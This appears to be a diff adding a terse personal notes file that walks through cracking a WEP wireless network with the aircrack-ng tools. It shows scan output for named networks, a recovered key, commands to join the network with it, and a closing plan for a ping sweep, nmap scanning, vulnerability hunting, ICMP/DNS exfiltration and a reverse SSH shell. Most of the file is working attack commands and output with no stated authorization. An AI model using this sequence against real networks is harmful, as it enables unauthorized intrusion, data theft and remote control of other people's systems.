@@ -1,0 +1,63 @@
+airmon-ng start wlan0
+airodump-ng mon0
+
+3. export that to a file. find the line with where there is wep. 
+4. gather the first column (MAC) and 6 column (channel)
+
+
+ E0:91:F5:FD:D7:E2  -84       28       27    0  11  54e  WEP  WEP         poolhouse  
+
+
+airodump-ng -c 11 --bssid E0:91:F5:FD:D7:E2 -w output mon0
+
+aireplay-ng -1 0 -a E0:91:F5:FD:D7:E2 mon0
+aireplay-ng -3 -b E0:91:F5:FD:D7:E2 mon0
+
+
+aircrack-ng output-01.cap 
+
+wait for "key found"
+
+
+
+
+ 00:24:8C:B3:65:51  -17      162       27    1  10  54e  WEP  WEP         blahblah
+
+    KEY FOUND! [ C6:30:90:99:39:ED:84:80:BD:1D:55:9F:68 ] 
+
+
+ Cell 05 - Address: 00:24:8C:B3:65:51
+                    Channel:11
+                    Frequency:2.462 GHz (Channel 11)
+                    Quality=70/70  Signal level=-18 dBm  
+                    Encryption key:on
+                    ESSID:"blahblah"
+                    Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 18 Mb/s
+                              24 Mb/s; 36 Mb/s; 54 Mb/s
+                    Bit Rates:6 Mb/s; 9 Mb/s; 12 Mb/s; 48 Mb/s
+                    Mode:Master
+                    Extra:tsf=000000014057d545
+                    Extra: Last beacon: 100ms ago
+                    IE: Unknown: 0008626C6168626C6168
+                    IE: Unknown: 010882848B962430486C
+                    IE: Unknown: 03010B
+                    IE: Unknown: 2A0104
+                    IE: Unknown: 2F0104
+                    IE: Unknown: 32040C121860
+                    IE: Unknown: DD090010180201F0000000
+                    IE: Unknown: DD180050F2020101800003A4000027A4000042435E0062322F00
+
+
+airmon-ng stop mon1
+
+iwlist wlan0 scan
+iwconfig wlan0 essid blahblah key C6:30:90:99:39:ED:84:80:BD:1D:55:9F:68
+udhcpc -i wlan0 -b
+
+
+
+
+after gets ipaddress. does a ping sweep then nmap of all targets. after that does a bit of vuln finding.
+checks for net connection
+icmp/dns exfil
+reverse ssh shell. done.
